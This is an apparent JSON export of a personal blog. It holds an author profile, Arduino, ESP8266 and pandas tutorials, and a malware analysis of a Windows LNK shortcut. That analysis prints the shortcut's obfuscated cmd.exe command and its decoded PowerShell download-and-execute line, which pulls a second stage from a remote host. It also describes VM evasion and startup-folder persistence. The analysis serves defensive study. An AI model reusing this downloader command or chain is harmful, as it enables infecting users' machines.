{"pages":[{"title":"Who Am I","text":"Hey Everyone I am D3xt3r, I work as Forward Engineer by day and Reverse Engineer by night, currently working as IoT Security Researcher my employments history involves working as web and mobile application developer, this is what boring me does for living or better yet a disguise I wear. My real self can be seen in the dark of night where I like to reverse malware for dinner and revere engineer some random binaries for deserts. I write on malware analysis, CTF’s and other security related for no profit and only fun, and just so that I don’t forget my reversing skills. I speak 5 languages java, c, c++, python and assembly, but my mother tongue is python and x86 assembly and I am reasonably fluent in ARM and MIPS. When I feel anxious or have a panic attack I retreat to my emacs to read some Linux kernel source code as it reminds me that, there is a greater problem in the world I need to worry about. Recently I am have been looking into Reversing Embedded System Firmware, fuzzing, exploitation and exploit development. DisclaimersNow it’s time for some disclamiers Use at your own riskAny action you take upon the information on this website is strictly at your own risk and I am not liable for any losses and damages in connection with the use of this website. ViewsThis disclaimer informs readers that the views, thoughts, and opinions expressed on this website belong solely to me, and not necessarily to the my employer, organization, committee or other group or individual. License All the content on this website is licensed under a Creative Commons License. All the source code on this website is licensed under a AGPLv3 License. Contact InformationYou can contact me at d3xt3rslab [at] protonmail [d0t] com","link":"/about/index.html"},{"title":"Categories","text":"","link":"/categories/index.html"},{"title":"CVE","text":"CVE ID Vulnerability Product Advisory CVE-2020-12763 Remote Buffer Overflow Wireless Camera Link","link":"/cve/index.html"},{"title":"Publications","text":"Blogposts TrendNet Wireless Camera buffer overflow vulnerability A case of Analysing Encrypted Firmware Research PaperAndroid Malware - this research Paper summarizing the attack possible on Android platform like SMS relay, Application Phishing, etc and how twitter can be used a Command and Control Center(C2), Apr 2014 - IJRET Download the paper CVE CVE ID Vulnerability Product Advisory CVE-2020-12763 Remote Buffer Overflow Wireless Camera Link","link":"/publications/index.html"},{"title":"Tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"Analyzing the Windows LNK file attack method","text":"Recently a friend of mine shared an interesting Malicious sample, it was a Microsoft shortcut file (LNK file) which after clicking(execution) lead to infection, although I was not aware of this type of attack vector before doing a basic research on google I was surprised that there is an increase in this type of attacks since 2017. In this post we will Analysis the LNK file malware and uncover how attacker uses multiple layers of obfuscation to evade AV and finally dropping malicious binary, we will also look into how to de-obfuscate each layer and understand what the code is doing. File we are analyzing is af6df15050dea1a756bb99bb0597d7072c2aee4c MotivationThe reason I got interested in this particular sample is how innocent this file looked and how convincing it was from a social-engineering standpoint. Been a shortcut file it doesn’t look suspicious to an average user as the file is not EXE. Next when user clicks the files, a browser windows pops up and it opens up the link https://get.adobe.com/br/flashplayer/ which make the user thinks that there is a flash plugin missing in his system that’s why he couldn’t open/execute the file, but once he has installed flash player and when he tries to open the file again and realizes its just a junk file its already too late. But in background what actually happens is it executes a Powershell command via shell command to downloads the next layer of Powershell script that does the actual downloading and installing of the main malicious executable. The file which it downloads is a BMP file which again looks an innocent image file but it actually is a disguised Powershell file. What is the LNK file?LNK is a file extension for a shortcut file used by Microsoft Windows to point to an executable file or an application. LNK files are generally used to create start menu and desktop shortcuts. LNK stands for LiNK. LNK files can be disguised as a legitimate document by changing the icon but it was not done in this sample. Basic AnalysisHere is a look at how the general file properties look like. Taking a look at the Shortcut tab will give us even more details, below is what it looks like. As you can see in the target field, it is pointing yo commands prompt executable with some arguments. This is the command which will run on executing this LNK file. But hold on this is not the entire command.The maximum length for Shortcut &gt; Target is only 260 characters. Anything longer than that will not be visible. However, the maximum length for a command line argument is 4096 characters, so we can’t see the whole command in the window above. I have used another tool to extract the entire command. Digging into LNK file formatUsing an LNK file analysis tool we can manage to get the whole embedded command as shown below Fields of interest from the above extract properties of LNK files are : KEY VALUE Relative path ..\\..\\..\\..\\Windows\\system32\\cmd.exe Working Directory %SystemRoot%\\System32 Arguments /V /C set x4OAGWfxlES02z6NnUkK=2whttpr0&amp;&amp;… Lets take a close look at the Arguments field which is a follows : 1c:\\Windows\\system32\\cmd.exe /V /C set x4OAGWfxlES02z6NnUkK=2whttpr0&amp;&amp;set L1U03HmUO6B9IcurCNNlo4=.com&amp;&amp; echo | start %x4OAGWfxlES02z6NnUkK:~2,4%s://get.adobe%L1U03HmUO6B9IcurCNNlo4%/br/flashplayer/ &amp;&amp;set aZM4j3ZhPLBn9MpuxaO= -win 1 &amp;&amp;set MlyavWfE=ndows&amp;&amp;set jA8Axao1xcZ=iEx&amp;&amp;set WMkgA3uXa1pXx=tRi&amp;&amp;set KNhGmAqHG5=bJe&amp;&amp;set 4kxhaz6bqqKC=LOad&amp;&amp;set rwZCnSC7T=nop&amp;&amp;set jcCvC=NEw&amp;&amp;set ZTVZ=wEbc&amp;&amp;set DABThzRuTT2hYjVOy=nt).dow&amp;&amp;set cwdOsPOdA08SZaXVp1eFR=t NeT.&amp;&amp;set Rb=Ers&amp;&amp;set j4HfRAqYXcRZ3R=hEll&amp;&amp;set Kpl01SsXY5tthb1=.bmp&amp;&amp;set vh7q6Aq0zZVLclPm=\\v1.0\\&amp;&amp;set 2Mh=pOw&amp;&amp;set 8riacao=%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%&amp;&amp;@echo off &amp;&amp; %SystemDrive% &amp;&amp; cd\\ &amp;&amp; cd %SystemRoot%\\System32 &amp;&amp;echo %jA8Axao1xcZ%(&quot;%jA8Axao1xcZ%(!jcCvC!-o%KNhGmAqHG5%c!cwdOsPOdA08SZaXVp1eFR!!ZTVZ!Lie!DABThzRuTT2hYjVOy!n%4kxhaz6bqqKC%S%WMkgA3uXa1pXx%NG('%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%')&quot;); | Wi!MlyavWfE!!2Mh!!Rb!!j4HfRAqYXcRZ3R!!vh7q6Aq0zZVLclPm!!2Mh!!Rb!!j4HfRAqYXcRZ3R! -!rwZCnSC7T!!aZM4j3ZhPLBn9MpuxaO! - Cleaning up the above messy command its just series of shell commands which are concatenated with &amp;&amp; when cleaned will look like as shown below. 12345678910111213141516171819202122232425set x4OAGWfxlES02z6NnUkK=2whttpr0set L1U03HmUO6B9IcurCNNlo4=.comecho | start %x4OAGWfxlES02z6NnUkK:~2,4%s://get.adobe%L1U03HmUO6B9IcurCNNlo4%/br/flashplayer/set aZM4j3ZhPLBn9MpuxaO= -win 1set MlyavWfE=ndowsset jA8Axao1xcZ=iExset WMkgA3uXa1pXx=tRiset KNhGmAqHG5=bJeset 4kxhaz6bqqKC=LOadset rwZCnSC7T=nopset jcCvC=NEwset ZTVZ=wEbcset DABThzRuTT2hYjVOy=nt).dowset cwdOsPOdA08SZaXVp1eFR=t NeT.set Rb=Ersset j4HfRAqYXcRZ3R=hEllset Kpl01SsXY5tthb1=.bmpset vh7q6Aq0zZVLclPm=\\\\v1.0\\\\set 2Mh=pOwset 8riacao=%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%@echo off%SystemDrive%cd\\\\cd %SystemRoot%\\\\System32echo %jA8Axao1xcZ%(&quot;%jA8Axao1xcZ%(!jcCvC!-o%KNhGmAqHG5%c!cwdOsPOdA08SZaXVp1eFR!!ZTVZ!Lie!DABThzRuTT2hYjVOy!n%4kxhaz6bqqKC%S%WMkgA3uXa1pXx%NG('%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%')&quot;); | Wi!MlyavWfE!!2Mh!!Rb!!j4HfRAqYXcRZ3R!!vh7q6Aq0zZVLclPm!!2Mh!!Rb!!j4HfRAqYXcRZ3R! -!rwZCnSC7T!!aZM4j3ZhPLBn9MpuxaO! --%ProgramFiles%\\\\Internet Explorer\\\\iexplore.exe each line in the above section is the shell command. The first couple of line is setting up some variables and then in line number 3 and the last line uses those variables to assemble those variables and execute it. This method of assembly and disassembly of variable names makes the code harder to read. The above obfuscated shell script decodes to the below two command: C:\\Windows\\system32\\cmd.exe /V /C set x4OAGWfxlES02z6NnUkK=2whttpr0&amp;&amp;set L1U03HmUO6B9IcurCNNlo4=.com &amp;&amp; echo | start https://get.adobe.com/br/flashplayer/ this command open up adobe flashplayer installation page on the browser window. echo iEx(&quot;iEx(New-Object Net.WebClient).DownloadString('hxxps://s3-eu-west-1.amazonaws.com/juremasobra2/jureklarj934t9oi4.bmp')&quot;); | WindowsPowershell\\v1.0\\Powershell -nop -win 1 --%ProgramFiles%\\\\Internet Explorer\\\\iexplore.exe this command actually download this second layer of Powershell which file which is disguised as a BMP file in the URL Decoding Second Layer PowershellThe Powershell script which was downloaded by the above LNK file can be found on this link fd60a8b790b42f0c416c28e4ad22dc317ad8fbc5 which it is heavily obfuscated, its obfuscated using ISESteriods. I did manage to decode the script and the readable code can be found on this link. The script on execution does the following: Checks if it’s running on inside a virtual machine, if it is running then it doesn’t execute rest of the command and exits. Otherwise, it processed to next steps. The script checks for the below list of virtual machines: VirtualBox VMware Virtual Platform Virtual Machine HVM domU Then it creates a Mutex with name 444444444444, this is to make sure that there is only one instance of this program running. If the previous step succeed then it downloads a zip which again disguised as an image file from following URL hxxps://s3-eu-west-1.amazonaws.com/juremasobra2/image2.png which is 887eafc19419df5119a829fd05d898503b7a0217 Renames the PNG file to ZIP file Extracts the content from the zip file which contains a DLL 92be09ca93ad6a8b04b7e2e2087fc6884fef1f63 and copies this files to startup folder. Then it uses a persistence mechanism by creating a shortcut file in the startup folder, this shortcut file(again LNK) invokes run32.dll in the command shell to run the malicious DLL binary. Since run32.dll is a built-in signed binary it doesn’t raise more suspicion. For example this command rundll32.exe shell32.dll, ShellExec_RunDLL notepad.exe will launch notepad.exe. Then the script sleeps for 40 sec and then restarts the machine. By above-mentioned persistence, technique attacker is trying to hide its malicious DLL binary behind a legitimate binary. More about this persistence mechanism can be found on this link All Files SHA1 Description af6df15050dea1a756bb99bb0597d7072c2aee4c malicious LNK file fd60a8b790b42f0c416c28e4ad22dc317ad8fbc5 Powershell file dropped by above LNK file 887eafc19419df5119a829fd05d898503b7a0217 ZIP file dropped by above Powershell file 92be09ca93ad6a8b04b7e2e2087fc6884fef1f63 Malicious DLL file unzip from above zip file Reference LNK file format Other attacks similar to this TreadMicro blog on threads on this type of attacks","link":"/2019/02/16/analyzing-the-windows-lnk-file-attack-method/"},{"title":"Connecting ESP8266-01 with Arduino UNO via Software serial","text":"If you ever heard of internet of a thing and have been fascinated by its possibilities and its promises then I am sure you must have heard of Arduino development boards. Arduino is a great piece of hardware to do some quick hardware prototyping and when you are confident with the prototype you go a step further and build more of these devices and make them work for you to do some sort of automation. Adding Wireless capability to Arduino projects will even make it more easy to install/use. In this post, I will connect the ESP8266 chip to Arduino Uno. We will see how we can create Access Point and connect to wireless networks. ESP8266 is a low-cost alternative to Arduino WiFi shield. Components required : Arduino Uno ESP8266-01 Bread board Couple of jumper wires Little introduction to ESP8266-01:ESP8266 is a low-cost WiFi chip with full TCP/IP stack and micro-controller unit capability. That means this chip can connect to a Wireless network or could act as an Access point, going a step further it could be a web server displaying sensor data of the sensor attached to it. All these features can be used just using this standalone chip just adding 3.3v power to it. The feature list includes: 802.11 b/g/n protocol Wi-Fi Direct (P2P), soft-Access Point Integrated TCP/IP protocol stack Going into technical specs: CPU - 80 MHz(default) or 160Mhz Memory - 64 KiB instruction, 96 KiB data Input - 16 GPIO pins Power - 3.3 Voltage and 200mA current We can reprogram this chip with different SDK’s. There are lots of different SDK’s out there like: NodeMCU - A Lua based firmware Arduino - A C++ based firmware if you like Arduino style programming MicroPython - for the love of Python it’s a port of Python for embedded devices which is also ported to ESP8266 there are many more. One limitation of this chip is that in this version only 2 GPIO pins are exposed although there are 16 GPIO pins which could be used. Connecting Arduino to ESP8266-01:We will connect Arduino to esp8266 via a software serial and try different AT commands. With AT commands we can connect to wireless network and create Access points, etc. But first follow the pin diagram below and make connections and be careful about the VCC connection don’t connect it to 5V or you are going to fry the ESP8266 chip (chips are already fried;). Upload the following sketch to your Arduino 1234567891011121314151617181920212223#include &lt;SoftwareSerial.h&gt;SoftwareSerial ESPSerial(2, 3); // RX, TXvoid setup() { // Open serial communications Serial.begin(115200); // set the data rate for the SoftwareSerial port // if this doesnt work you for you then try different baud rate ESPSerial.begin(115200); ESPSerial.println(&quot;Ready to take AT commands&quot;);}void loop() { // run over and over if (ESPSerial.available()) { // reads input from serial console and writes to esp8266 Serial.write(ESPSerial.read()); } if (Serial.available()) { // reads input from esp8266 and writes to serial console ESPSerial.write(Serial.read()); }} Once you have made the connections open up the serial console and power up your Arduino you should be able to see a red light on the ESP8266 indicating it is powered and should display random character printing on the serial console this means congratulations connection is made successfully. Now let’s try out different AT commands. Open Tools &gt; Serial Monitor in your Arduino IDE and set Both NL &amp; CR and Baud to 115200 or whatever baud rate you have set in the code or else you won’t see any output. I am using latest firmware v1.154 version which has an additional feature which is highlighted in the AT-commands sections below. Default baud rate for this firmware is 115200. AT-commands Primer :Basic commands (Hello 123 mike testing!) : Test for startup type AT response will return OK. AT-RST will reset the module return will be a whole lot of information about the module. AT-GMR check firmware version response : 123&lt;AT version info&gt;&lt;SDK version info&gt;&lt;compile time&gt; AT-GSLP=&lt;time&gt; enter deep sleep mode (why not save some power): esp8266 will wake after deep sleep for as many milliseconds(ms) in time indicates response will be &lt;time&gt; OK Wi-Fi AT Commands : With new SDK certain old commands are deprecated and new commands are available usually prepended by _CUR if the configuration not to be saved on flash memory and _DEF if the configuration has to be saved on flash memory. Set the Wi-Fi Mode (Station/AccessPoint/Station+AccessPoint): command : AT+CWMODE[_CUR/_DEF]=&lt;mode&gt; : CODE MODE 1 Station mode 2 AccessPoint mode 3 AccessPoint+Station mode response OK example - AT+CWMODE_DEF=3 will make the chip act as both station and Access point this setting will be saved on flash memory as the chip will start in this mode even after the restart. Connecting to as Access Point : command : AT+CWJAP[_CUR/_DEF]=&lt;ssid&gt;,&lt;pwd&gt;[,&lt;bssid&gt;] Parameters: 1. &lt;ssid&gt;': the SSID of the target AP. 2. ‘: password, MAX: 64-byte ASCII. 3. &lt;bssid&gt;': the target AP's MAC address, used when multiple APs have the same SSID. 4. ` : (for reference only) 1. connection timeout. 2. wrong password. 3. cannot find the target AP. 4. connection failed. **response** - `OK` **example** - `AT+CWJAP_CUR=&quot;abc&quot;,&quot;0123456789&quot;,&quot;ca:d7:19:d8:a6:44&quot;` will connect to access point with ssid abc and password 0123456789 and bssid ca:d7:19:d8:a6:44 and configuration will not be saved on the flash. Lists Available Access Points : command : AT+CWLAP=&lt;ssid&gt;[,&lt;mac&gt;,&lt;ch&gt;],&lt;ecn&gt;,&lt;ssid&gt;,&lt;rssi&gt;,&lt;mac&gt;,&lt;ch&gt;,&lt;freq offset&gt;,&lt;freq calibration&gt; - it also provide ability to query the access points with specific SSID and MAC on specific channel Parameters: &lt;ecn&gt;: encryption method : CODE METHOD 0 OPEN 1 WEP 2 WPA_PSK 3 WPA2_PSK 4 WPA_WPA2_PSK 5 WPA2_Enterprise (AT can NOT connect to WPA2_Enterprise AP for now.) &lt;ssid&gt;: string parameter, SSID of the AP. &lt;rssi&gt;: signal strength. &lt;mac&gt;: string parameter, MAC address of the AP. &lt;freq offset&gt;: frequency offset of AP; unit: KHz. The value of ppm /2.4. &lt;freq calibration&gt;: calibration for the frequency offset. response - OK example - AT+CWLAP=&quot;Wi-Fi&quot; search for APs with a designated SSID. Lists Available Access Points : AT+CWLAP Disconnects from the AP command AT+CWQAP Configures the ESP8266 Access Point: command : AT+CWSAP[_CUR/_DEF]=&lt;ssid&gt;,&lt;pwd&gt;,&lt;chl&gt;,&lt;ecn&gt;,&lt;max conn&gt;,&lt;ssid hidden&gt; Parameters: &lt;ssid&gt;: string parameter, SSID of AP. &lt;pwd&gt;: string parameter, length of password: 8 ~ 64 bytes ASCII. &lt;chl&gt;: channel ID. &lt;ecn&gt;: encryption method: WEP is not supported. CODE ENC TYPE 0 OPEN 2 WPA_PSK 3 WPA2_PSK 4 WPA_WPA2_PSK [&lt;max conn&gt;] (optional): maximum number of Stations to which ESP8266 SoftAP can be connected; within the range of [1, 4]. [&lt;ssid hidden&gt;] (optional): CODE DESC 0 SSID is broadcasted. (the default setting) 1 SSID is not broadcasted response - OK example : AT+CWSAP_DEF=&quot;ESP8266&quot;,&quot;1234567890&quot;,5,3 creates access point with designated name and password on channel 5 with WPA2_PSK encryption. TCP/IP-Related AT Commands : To try this commands first connect to a Wireless network using the command shown in the above section Enable multiple connections : AT+CIPMUX=1 Find out the IP address of the module : AT+CIFSR Establishes TCP Connection, UDP Transmission or SSL Connection : command : AT+CIPSTART=&lt;type&gt;,&lt;remote IP&gt;,&lt;remote port&gt;[,&lt;TCP keep alive&gt;] Parameters : &lt;type&gt;: string parameter indicating the connection type: “TCP”, “UDP” or “SSL”. &lt;remote IP&gt;: string parameter indicating the remote IP address. Parameters. &lt;remote port&gt;: the remote port number. [&lt;TCP keep alive&gt;]: detection time interval when TCP is kept alive; this function is disabled by default. 0 to disable TCP keep-alive. 1 ~ 7200 - detection time interval; unit: second (s). Listen for a connection on a specific port: command AT+CIPSERVER=&lt;mode&gt;,&lt;port&gt; mode 1 is to create server and 0 is to delete the server. Send data on TCP connection: AT+CIPSEND - Sends Data on the TCP connection on which you were Listening on (read manual in the link for more details). Conclusion:We saw how we could add wireless capability to Arduino project and using the above command we can create network connections read and write data(sensor data/commands) to and from a server, which gives us full TCP/UDP networking capability. I would highly recommend you to read the manual to explore various other commands and have fun with it. In the next post I will show how we can read sensor data and send it to the central server and display its data on a mobile application. Useful links Wikipedia AI-thinker firmware download Complete list of AT instruction set","link":"/2017/07/21/arduino-uno-esp8266-software-serial/"},{"title":"ARM Architecture and Shellcode Webinars","text":"In the past few months I did some webinar on ARM architecture and shellcode, I thought it would be good idea to create a post which has links to all of those webinars. Exploiting ARM based IoT DevicesThis is the first webinar which, in this I explain about write assembly code for ARM architecture and after that how to cross-compile the code and emulate the code on QEMU which was running on my x86-64 system. HITBCyberWeek​ LAB - Writing Bare-Metal ARM ShellcodeThis workshop builds on the previous one, in this workshop after giving a brief introduction about ARM architecture in another section I have added another interesting Lab where I demostrate exploiting a micro-controller. The tricky part is write the shellcode for the microcontroller because in this case we don’t have standard OS system call to do our dirty work.","link":"/2021/02/15/arm-architecture-webinar/"},{"title":"Control high voltage device with arduino and IR remote control","text":"There are lots of sensors that we can play around with Arduino but usually, they operate on 3.3v or 5v but what if you want to control high voltage circuits that don’t operate on such low voltage. Well for these types of devices we use relay circuits. There are different types of Relay circuits with based on parameters like how much current/voltage it can handle, what is the voltage required for controlling their relay etc. The relay circuit we are going to use for this post is operating on 5V and can handle device having a voltage rating of 10A-125V to 10A-230V AC and 10A-28V to 10A-30V DC. MotivationLong time ago when I was first introducted to mini development boads I was reading about raspberry pi DIY projects, and I came across home automation project which to me was very fascinating, reading further on the topic I realised there are zigbee and z-wave products for commuincation and controlling home appliances which made the whole project costly some of the products were even costly then raspberry pi itself. Later I can across arduino and relay circuits which made my hopes of affordable home automation come alive. Most of home appliance work within 230V in India which can be controlled by Arduino which help of relay circuits. Project IdeasIn this post, we will control relay circuit with Arduino. We will use 4 channel relay circuit which will allow us to control up to 4 devices operating within the relay rating. We need to feed some input to Arduino to indicate which relay channel to turn on/off for that we will use IR remote control and attach an IR receiver LED to Arduino to receive the infrared signal from the remote. We will bind 4 keys of IR remote control to 4 channels of the relay by programming Arduino. Components required Arduino Uno Relay circuit (of rating 125v to 230v AC and 28V to 30V DC) IR remote control IR receiver module breadboard jumper wires Accepting commands from IR remote control First, we need to identify codes of at least four buttons on IR remote control. For that, we will read data from the signal pin of IR receiver module connected to Arduino on pin 11 when a particular button is pressed. The code for this is as below : Download IR receiver LED library from this link. Import the library in your Arduino IDE (Sketch -&gt; Import Library -&gt; IR). 123456789101112131415161718#include &lt;IRemote.h&gt;int IR_RECV_PIN = 11;IRrecv irrecv(IR_RECV_PIN);decode_results results;void setup(){ Serial.begin(9600); // Start the receiver irrecv.enableIRIn();}void loop(){ // Receive the next value if (irrecv.decode(&amp;results)) { Serial.println(results.value, HEX); irrecv.resume(); // Receive the next value }} Above code will print IR remote button code in hexadecimal on the serial monitor. Take note of codes any four buttons which you want to use. This setup can also read button codes of other IR remote control in your house like Air Condition or Television remote. So you can even use your TV remote to control our relay circuit. The button codes which we read through this code may or may differ for different remote control, so it’s necessary to the above exercise to get codes of the buttons. Using Relay circuit to control HIGH voltage deviceFor an electrical device to run it has to form a close path for current to flow if we break the circuit(open path) current stops electrical device turned off this working this how switches work. When you turn on the switch it forms a close path and the device turned on and vice versa. With relay circuits, we can do this thing programmatically. If you look closely in the image above, it has two terminal operating at different voltages, a HIGH voltage terminal where the device will be connected(upper side) and LOW voltage terminal which will be connected to Arduino (bottom right). In our case we are using 4 channel relay circuit, each channel has three HIGH voltage terminals (NC, NO, and C). To control the device we break the circuit and connect one end of the wire to C (common connection) terminal on one channel of the relay circuit. Relay offers two close paths, we connect our other end of device wire to one of the terminals NC (normally closed) or NO (normally open). NC forms close configuration when Arduino sends the HIGH signal to relay’s corresponding signal pin and NO forms close configuration when Arduino sends LOW or signal. Each relay can form close configuration with either NC or NO at any instance of time not with both at the same time. So if you want to turn on the device when Arduino sends a LOW signal then connect the other end of the device with NC pin. Now that we know the purpose of HIGH voltage pins. Let see how low voltage terminal influences the electrical path of HIGH voltage terminals. Low voltage path is controlled by Arduino digital pin. If Arduino send’s a HIGH signal to the signal pin on the relay circuit the electromagnet becomes charged and moves the switch, which in turn form a close configuration with NO pin, putting relay circuit in activated state which starts the flow of current in the device. Relay circuit in activated state forms close configuration with NO pin and in deactivated state close configuration with NC pin. In a similar manner, each relay circuit has a corresponding signal pin which is connected to the digital pin of Arduino board. Below is the working diagram of the relay circuit. Relay circuit Schematic diagramBelow is the schematic diagram of relay circuit interfaced with Arduino The code below will turn on each relay circuit at a 3-second interval. Here we are just simply turning on the circuit without any external input. We can also turn on/off the relay circuit when certain conditions are met like if the temperature sensor is reading of 23 deg and above we could turn on the fan or if a PIR sensor detects a person has entered the room so turn on the light, etc. In our case, we will turn on/off the relay circuit based on the button pressed on IR remote control. 123456789101112131415161718192021222324252627int CHANNEL_1 = 6;int CHANNEL_2 = 7;int CHANNEL_3 = 8;int CHANNEL_4 = 9;void setup() { pinMode(CHANNEL_1, OUTPUT); pinMode(CHANNEL_2, OUTPUT); pinMode(CHANNEL_3, OUTPUT); pinMode(CHANNEL_4, OUTPUT); // set output pin to low state digitalWrite(CHANNEL_1, LOW); digitalWrite(CHANNEL_2, LOW); digitalWrite(CHANNEL_3, LOW); digitalWrite(CHANNEL_4, LOW);}void loop() { digitalWrite(CHANNEL_1, HIGH); delay(3000); digitalWrite(CHANNEL_2, HIGH); delay(3000); digitalWrite(CHANNEL_3, HIGH); delay(3000); digitalWrite(CHANNEL_4, HIGH); delay(3000);} Putting it all togetherFinally we are in position of make IR remote control and relay circuit to work together. Below is the schematic diagram the circuit. You can change button code below with the button code you have discovered for your remote control other pin configurations are in the variables. You can directly copy paste and the below sketch in your Arduino IDE and upload the code. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#include &lt;IRemote.h&gt;int IR_RECV_PIN = 11;int CHANNEL_1 = 6;int CHANNEL_2 = 7;int CHANNEL_3 = 8;int CHANNEL_4 = 9;int BUTTON_1_CODE = 0XF345;int BUTTON_2_CODE = 0XFB45;int BUTTON_3_CODE = 0XFE70;int BUTTON_4_CODE = 0XF2C1;IRrecv irrecv(IR_RECV_PIN);decode_results results;void setup(){ Serial.begin(9600); irrecv.enableIRIn(); pinMode(CHANNEL_1, OUTPUT); pinMode(CHANNEL_2, OUTPUT); pinMode(CHANNEL_3, OUTPUT); pinMode(CHANNEL_4, OUTPUT); digitalWrite(CHANNEL_1, LOW); digitalWrite(CHANNEL_2, LOW); digitalWrite(CHANNEL_3, LOW); digitalWrite(CHANNEL_4, LOW);}void loop(){ int button_1_state = 0, button_2_state = 0, button_3_state = 0, button_4_state = 0; // Receive the next value if (irrecv.decode(&amp;results)) { Serial.println(results.value, HEX); irrecv.resume(); // Receive the next value switch(results.value) { case BUTTON_1_CODE: Serial.printf(&quot;Button 1 pressed !&quot; ); if(button_1_state == 0 ) { digitalWrite(CHANNEL_1, HIGH); button_1_state = 1; }else{ digitalWrite(CHANNEL_1, LOW); button_1_state = 0; } break; case BUTTON_2_CODE: Serial.printf(&quot;Button 1 pressed !&quot; ); if(button_2_state == 0 ) { digitalWrite(CHANNEL_2, HIGH); button_2_state = 1; }else{ digitalWrite(CHANNEL_2, LOW); button_2_state = 0; } break; case BUTTON_3_CODE: Serial.printf(&quot;Button 1 pressed !&quot; ); if(button_3_state == 0 ) { digitalWrite(CHANNEL_3, HIGH); button_3_state = 1; }else{ digitalWrite(CHANNEL_3, LOW); button_3_state = 0; } break; case BUTTON_4_CODE: Serial.printf(&quot;Button 1 pressed !&quot; ); if(button_4_state == 0 ) { digitalWrite(CHANNEL_4, HIGH); button_4_state = 1; }else{ digitalWrite(CHANNEL_4, LOW); button_4_state = 0; } break; default: Serial.printf(&quot;Unknown button pressed&quot; ); } }} ConclusionWe saw how we can control high voltage devices with Arduino IR remote control. You can even extend this project to control the relay circuit with your mobile device, wireless communication between mobile and Arduino can be taken care by using ESP8266 module here is the link to post. Electrical circuits used in this post are available for a couple of bucks so making a home automation project is really not that costly. Useful Links IR receiver LED library","link":"/2017/01/01/control-high-voltage-device-with-arduino-and-IR-remote-control/"},{"title":"Data cleaning in python using pandas","text":"Data cleaning is a very important part of any data science project as data scientist spend 80% of their time is this step of the project. But not very much attentions is given to the cleaning process and not much research efforts are put to create any sort of framework recently I came across an amazing paper titled as Tidy data by Hadley Wickham in Journal of Statistical Software in which he talks about common problems one might encounter in data cleaning and what a Tidy data looks like I couldn’t agree more to him, he has also created a R package reshape and reshape2 for data cleaning, but the problem was the paper had very little to no code I also found the code version of the paper but it was in R, while most of my data cleaning work is done in pandas, I had to translate all those R solutions to pandas equivalent, so in this post the I will summarize all the main idea of the paper that the author suggests in the paper and also how we can solve it in pandas. Basic terminologyIt’s good to define terms that bring reads and writer on the same mindset. A data-set is a collection of values, usually either numbers (if quantitative) or strings (if qualitative). Values are organised in two ways. A Variable contains all values that measure the same underlying attribute (like height, temperature, duration) across units. A Observation contains all values measured on the same unit (like a person, or a day, or a race) across attributes. Every value belongs to a variable and a observation. To make the terms more clear let consider an example of a user information example below: Name Age Country Gender Gustavo 24 Colombia Male Hussain 34 India Male Messy 35 Argentina Male Teresa 45 India Female The above data-set have 16 values representing 4 variables and 4 observation. Which can be broken down as follow: There are 4 variable (name, age, country and gender) Gender variable has two possible values(M/F) these kinds of variable are generally call categorical variables Country variable as 3 distinct values. Its really important to understand the terms observation and variable, as they will be extensively used in upcoming sections. What is tidy data?Once you have understood the concept of observation and variable we are ready to define what is tidy data. In tidy data: Each variable forms a column. Each observation forms a row. Each type of observational unit forms a table. This is Codd’s 3rd normal form (Codd 1990), Messy data is any other arrangement then this form. One might use various methods to extract variable but this might slow the analysis and invites error. Mapping rows, columns and tables to observation, variables and types will provide a good conceptual framework to map an entity to a functional form, for example, if you are are building a model to predict housing price based on features like location, area, number of rooms, etc. Price variable becomes a function of other variables of the table. The author suggested that there are mainly five problems commonly observed in messy data which are as follows : Column headers are values, not variable names Multiple variables are stored in one column Variables are stored in both rows and columns Multiple types of observational units are stored in the same table A single observational unit is stored in multiple tablesfor the rest of the post we will discuss what these problems look like and how to fix them. Five most common problems with messy data-sets:Column headers are values, not variable namesTo better illustrate this problem lets consider are pewforum.org Income data of various religious group in the US. First 12 rows of the data is shown below As you can see there are 6 columns which are religion, 4 income groups and sample size. You can see the problem here income variable is stored in the column header, just 3 variables religion, income and sample size would have been sufficient, the income variable would have 4 possible values ( &lt;30k / &gt;30k and &lt;50k / &gt;50k and &lt;100k / &gt;100k). There are two main arguments as to why this form of representation is called messy : 1. Data in this format are usually designed for presentation not ideal for analysis. 2. Variables are presents in both columns and rows. To solve this problem these issue there is a melt function in pandas which can be accessed as pandas.melt to perform this operation we need two parameters id variable(id_vars) and value variables(val_vars), id variable will we the variable to which the columns headers will be mapped, in this example we will choose Religious tradition as the id variable to 4 different values of income groups as value variables. You can see the problem of repeated values in Religious tradition variable which was mentioned before. 12345678910111213# religious_df is the dataframe which stores above tableIn [1]: value_variables = ['Less than $30000','$30000-$49999','$50000-$99999','$100000 or more']In [2]: religious_df = religious_df.melt(id_vars=['Religious tradition'], value_vars=value_variables)In [3]: religious_df[religious_df['Religious tradition'] == 'Buddhist']Out[3]:Religious tradition variable value0 Buddhist Less than $30000 3612 Buddhist $30000-$49999 1824 Buddhist $50000-$99999 3236 Buddhist $100000 or more 13 There are good sides to this kind of data which are: 1. Values are sorted efficiently as there are no repeated values as you can see the tidy form of data below has repeated values, this problem can be dealt with table normalization. 2. Matrix operation can be done efficiently for example if we had another data of income of religious groups of Europe and we wanted to combine the data of both countries in one dataframe then simple matrix addition operation followed by value normalization would have solved the matter. Multiple variables are stored in one columnThis is usually due to the way data is represented, person’s full name is an example of this problem. Full name has 3 possible variable first name, middle name and surname, the first name indicating the person and middle name can point to another row in the table and surname can help you to find the group of people belonging to the same family for example in kaggle titanic data we can extract this column from full name. This procedure is similar to feature engineering sometimes, the gender variable must be missing but it can be extracted from the full name if the name has the title (Miss / Mr / Mrs / Ms). Solution to this problem is to split the column having multiple variable into individual variable, in the full name example its simple as string split but in some case you may have to apply so 